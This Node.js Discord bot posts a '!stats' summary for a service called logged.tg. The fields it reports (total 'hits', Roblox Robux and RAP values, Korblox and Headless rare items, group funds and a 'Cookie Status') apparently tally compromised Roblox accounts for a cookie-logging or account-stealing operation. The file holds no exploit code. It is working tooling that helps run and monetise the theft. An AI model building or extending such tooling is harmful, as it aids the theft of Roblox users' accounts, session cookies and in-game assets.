require("dotenv").config({ path: require("path").join(__dirname, "../.env.local") });

const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  ActivityType,
} = require("discord.js");
const fetch = require("node-fetch");

// ── Config ──────────────────────────────────────────────────────────────────────
const DISCORD_TOKEN  = process.env.DISCORD_BOT_TOKEN;
const STATS_API_URL  = process.env.STATS_API_URL;   // e.g. https://your-app.vercel.app/api/stats
const STATS_SECRET   = process.env.STATS_API_SECRET ?? "";
const STATS_CHANNEL  = process.env.STATS_CHANNEL_ID ?? null;
const PREFIX         = "!";

// ── Discord client ──────────────────────────────────────────────────────────────
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

// ── Stats fetcher ───────────────────────────────────────────────────────────────

async function fetchStats() {
  if (!STATS_API_URL) {
    throw new Error(
      "STATS_API_URL is not set.\n" +
      "Set it to your deployed Vercel URL: https://your-app.vercel.app/api/stats"
    );
  }

  const res = await fetch(STATS_API_URL, {
    headers: STATS_SECRET
      ? { Authorization: `Bearer ${STATS_SECRET}` }
      : {},
  });

  const json = await res.json();

  if (!res.ok || !json.ok) {
    throw new Error(json.error ?? `API returned ${res.status}`);
  }

  return json.stats;
}

// ── Format helpers ──────────────────────────────────────────────────────────────

function fmt(n) {
  const num = Number(n ?? 0);
  if (num >= 1_000_000) return (num / 1_000_000).toFixed(2) + "M";
  if (num >= 1_000)     return (num / 1_000).toFixed(1)     + "K";
  return num.toLocaleString("en-US");
}

function robux(n) {
  return `R$ ${fmt(n)}`;
}

// ── Embed builder ───────────────────────────────────────────────────────────────

function buildStatsEmbed(stats, requester) {
  const color = stats.isPremium ? 0xf5a623 : 0x5865f2;

  return new EmbedBuilder()
    .setColor(color)
    .setTitle(`${stats.displayName}  |  logged.tg`)
    .setURL("https://logged.tg/dashboard")
    .setDescription(
      `**Username:** \`${stats.userName}\`` +
      (stats.isPremium ? " — **Premium**" : "")
    )
    .setThumbnail(
      stats.avatar?.startsWith("http")
        ? stats.avatar
        : "https://logged.tg/favicon.ico"
    )

    // Row 1 — core counters
    .addFields(
      { name: "Total Hits",   value: `\`\`\`${fmt(stats.accounts)}\`\`\``, inline: true },
      { name: "Site Visits",  value: `\`\`\`${fmt(stats.visits)}\`\`\``,   inline: true },
      { name: "Summary",      value: `\`\`\`${robux(stats.summary)}\`\`\``,inline: true }
    )

    // Row 2 — economy
    .addFields(
      { name: "Total RAP",    value: `\`\`\`${robux(stats.rap)}\`\`\``,      inline: true },
      { name: "Balance",      value: `\`\`\`${robux(stats.balance)}\`\`\``,  inline: true },
      { name: "Limiteds RAP", value: `\`\`\`${robux(stats.rapItems)}\`\`\``, inline: true }
    )

    // Rare items
    .addFields({
      name:  "Rare Items",
      value: `Korblox:  ${stats.hasKorblox  ? "Yes" : "No"}\nHeadless: ${stats.hasHeadless ? "Yes" : "No"}`,
      inline: false,
    })

    // Billing
    .addFields(
      {
        name:  "Subscription",
        value: `Active: ${stats.subActive ? "Yes" : "No"}` +
               (stats.subExpires ? `\nExpires: ${stats.subExpires}` : ""),
        inline: true,
      },
      {
        name:  "Billing",
        value: `Total:  ${robux(stats.billingTotal)}\nCredit: ${robux(stats.credit)}`,
        inline: true,
      },
      { name: "\u200b", value: "\u200b", inline: true }
    )

    // Groups
    .addFields({
      name:  "Groups",
      value: `Owned:   **${stats.groupsOwned}**\nBalance: ${robux(stats.groupBalance)}\nPending: ${robux(stats.groupPending)}`,
      inline: true,
    })

    // Cookie
    .addFields({
      name:  "Cookie Status",
      value: stats.cookieStatus === "Valid" ? "Valid" : "None",
      inline: true,
    })

    .setFooter({
      text:    `Requested by ${requester.tag}  •  logged.tg`,
      iconURL: requester.displayAvatarURL({ dynamic: true }),
    })
    .setTimestamp();
}

// ── Events ──────────────────────────────────────────────────────────────────────

client.once("ready", () => {
  console.log(`[logged.tg bot] Online as ${client.user.tag}`);
  client.user.setActivity("logged.tg/dashboard", { type: ActivityType.Watching });
});

client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.guild)     return;

  const content = message.content.trim();
  if (!content.startsWith(PREFIX)) return;

  const command = content.slice(PREFIX.length).trim().split(/\s+/)[0].toLowerCase();

  // ── !stats ─────────────────────────────────────────────────────────────────
  if (command === "stats") {
    if (STATS_CHANNEL && message.channel.id !== STATS_CHANNEL) return;

    await message.channel.sendTyping();

    try {
      const stats = await fetchStats();
      const embed = buildStatsEmbed(stats, message.author);
      await message.reply({ embeds: [embed] });
    } catch (err) {
      console.error("[logged.tg bot] !stats error:", err.message);
      await message.reply({
        embeds: [
          new EmbedBuilder()
            .setColor(0xed4245)
            .setTitle("Failed to fetch stats")
            .setDescription(`\`\`\`${err.message.slice(0, 400)}\`\`\``)
            .setTimestamp(),
        ],
      });
    }

    return;
  }

  // ── !help ──────────────────────────────────────────────────────────────────
  if (command === "help") {
    await message.reply({
      embeds: [
        new EmbedBuilder()
          .setColor(0x5865f2)
          .setTitle("logged.tg Bot — Commands")
          .addFields(
            { name: "`!stats`", value: "Fetch live stats from your logged.tg dashboard.", inline: false },
            { name: "`!help`",  value: "Show this help message.",                          inline: false }
          )
          .setTimestamp(),
      ],
    });
  }
});

// ── Start ───────────────────────────────────────────────────────────────────────

if (!DISCORD_TOKEN) {
  console.error("[logged.tg bot] DISCORD_BOT_TOKEN is not set.");
  process.exit(1);
}

client.login(DISCORD_TOKEN);
